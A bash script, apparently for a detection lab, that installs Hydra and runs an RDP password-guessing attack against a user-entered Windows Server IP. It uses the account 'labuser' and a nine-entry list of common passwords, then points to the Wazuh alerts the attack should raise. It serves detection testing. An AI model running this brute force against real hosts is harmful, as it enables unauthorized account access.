#!/bin/bash

echo "========================================="
echo "   RDP BRUTE FORCE ATTACK DEMO           "
echo "   MITRE ATT&CK: T1110.001               "
echo "========================================="

# Get Windows Server IP
read -p "Enter Windows Server IP: " WINDOWS_IP

echo -e "\n[*] Target: $WINDOWS_IP"
echo "[*] Attack Type: RDP Brute Force"
echo "[*] MITRE Technique: T1110.001 - Brute Force: Password Guessing"

# Install hydra if not present
if ! command -v hydra &> /dev/null; then
    echo "[*] Installing hydra..."
    sudo apt-get update -qq
    sudo apt-get install -y hydra
fi

# Create password list
echo -e "\n[*] Creating password list..."
cat > /tmp/rdp-passwords.txt << PASS
password
admin
Password1
Welcome1
password123
letmein
Admin123
Password123!
P@ssw0rd
PASS

echo "[*] Password list created with 9 passwords"

echo -e "\n[*] Starting brute force attack in 5 seconds..."
echo "[*] This will trigger FAILED LOGIN alerts in Wazuh"
sleep 5

echo -e "\n========================================="
echo "   ATTACK IN PROGRESS                    "
echo "========================================="

# Launch brute force attack
hydra -l labuser -P /tmp/rdp-passwords.txt rdp://$WINDOWS_IP -t 4 -V -f

echo -e "\n========================================="
echo "   ATTACK COMPLETE                       "
echo "========================================="
echo "[*] Check Wazuh Dashboard for:"
echo "    - Multiple failed authentication attempts"
echo "    - Brute force attack detection"
echo "    - Source IP: $(hostname -I | awk '{print $1}')"
echo "    - Target account: labuser"
echo "    - Time: $(date)"
echo "========================================="

# Cleanup
rm /tmp/rdp-passwords.txt

echo -e "\n[!] Go to Wazuh Dashboard:"
echo "    Security Events → Filter by Windows-Server-2022"
echo "    Look for Rule: 'Multiple Windows Logon Failures'"
